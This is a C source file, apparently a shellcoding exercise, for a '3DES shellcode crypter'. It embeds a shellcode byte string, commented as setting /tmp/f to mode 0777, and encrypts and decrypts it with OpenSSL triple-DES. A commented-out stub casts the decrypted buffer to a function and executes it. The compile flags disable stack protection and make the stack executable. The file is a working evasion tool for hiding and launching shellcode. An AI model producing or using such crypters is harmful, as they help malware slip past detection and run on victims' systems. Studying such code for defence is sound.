/* ***
 *
 *  3DES Shellcode crypter by d7x
 *
 *  d7x.promiselabs.net
 *
 *  Usage: gcc -fno-stack-protector -zexecstack -m32 -o 3des_crypter 3des_crypter.c -lssl -lcrypto
 *
 * ***/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/des.h>

/* Triple DES key for Encryption and Decryption */
DES_cblock Key1 = "3DES";
DES_cblock Key2 = "Crypter";
DES_cblock Key3 = "by d7x";
DES_key_schedule SchKey1,SchKey2,SchKey3;

/* Print Encrypted and Decrypted bytes */
void print_data(const char *tittle, const void* data, int len);

int main()
{

	/* Apply 3DES keys */ 
	DES_set_key((DES_cblock *)Key1, &SchKey1);
	DES_set_key((DES_cblock *)Key2, &SchKey2);
	DES_set_key((DES_cblock *)Key3, &SchKey3);

	/* Place shellcode here */
	unsigned char input_data[] = "\xbb\xcc\xfe\x70\x5c\xdb\xd8\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x08\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x39\x67\x1a\x53\x99\xca\x33\x6c\x19\xeb\xc3\x5c\x6d\x86\xb3\x8d\xeb\x58\x6f\xba\x0c\x59\x8f\x3a\xab\x97\x0f\x50\x4a\x70\xdd\x25"; 
	/* => chmods /tmp/f to 0777 */

	/* Init vector */
	DES_cblock iv = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	// DES_cblock iv = { 0xe1, 0xe2, 0xe3, 0xd4, 0xd5, 0xc6, 0xc7, 0xa8 };
	DES_set_odd_parity(&iv);
	
	/* Check for Weak key generation: https://www.openssl.org/docs/manmaster/man3/DES_set_key_checked.html,  
	 * If the key is a weak key, then -2 is returned */
	if ( -2 == (DES_set_key_checked(&Key1, &SchKey1) || DES_set_key_checked(&Key2, &SchKey2) || DES_set_key_checked(&Key3, &SchKey3)))
	{
		printf(" Weak key ....\n");
		return 1;
	}
	
	/* Buffers for Encryption and Decryption */
	unsigned char* cipher[sizeof(input_data)];
	unsigned char* text[sizeof(input_data)];
	
	/* Triple-DES CBC Encryption */
	DES_ede3_cbc_encrypt( (unsigned char*)input_data, (unsigned char*)cipher, sizeof(input_data), &SchKey1, &SchKey2, &SchKey3,&iv, DES_ENCRYPT);
	
	/* Triple-DES CBC Decryption */
	memset(iv,0,sizeof(DES_cblock)); // You need to start with the same iv value
	DES_set_odd_parity(&iv);
	DES_ede3_cbc_encrypt( (unsigned char*)cipher, (unsigned char*)text, sizeof(input_data), &SchKey1, &SchKey2, &SchKey3,&iv,DES_DECRYPT);

	/* Place the encrypted output here to verify the integrity */
	unsigned char c[] = \
"\xd5\x0c\x1e\xee\xfd\x1f\xb4\x50\xac\xde\x1a\x59\x4c\x10\xe9\x7a\x2c\xb0\x09\x79\x2c\xe0\x28\x17\xf4\x60\xc9\x0a\x33\x27\x48\x03\xc4\x8d\x4d\x26\x0b\x7c\xdd\xa9\xcf\x65\x0f\xac\xd3\xc2\xa8\x67\xde\xf6\x83\x02\x8a\x01\xa8\x1f\x95\x23\x94\x25\xdf\xce\xa3\x79\x0c\xdc\x81\xf7";
	unsigned char decrypted[sizeof(c)];

	// DES_set_odd_parity(&iv);
	memset(iv,0,sizeof(DES_cblock)); // You need to start with the same iv value
	DES_set_odd_parity(&iv);
	DES_ede3_cbc_encrypt( (unsigned char*)c, (unsigned char*)decrypted, sizeof(c), &SchKey1, &SchKey2, &SchKey3,&iv,DES_DECRYPT);
	
	/* Printing and Verifying */
	print_data("\n Original ",input_data,strlen(input_data));
	print_data("\n Encrypted",cipher,strlen(cipher));
	print_data("\n Decrypted",text,strlen(input_data));
	print_data("\n Decrypted (manual) ",decrypted,strlen(decrypted));

	/* Run shellcode */
	/* int (*ret)() = (int(*)())decrypted;
	ret(); */
	
	return 0;
}

void print_data(const char *tittle, const void* data, int len)
{
	printf("%s : ",tittle);
	const unsigned char * p = (const unsigned char*)data;
	int i = 0;
	
	/* len-1 to omit the \x00 null terminator at the end */
	for (; i<len;++i)
		printf("\\x%02x", *p++);
	printf(" Size: %d", len);
	
	printf("\n");
}


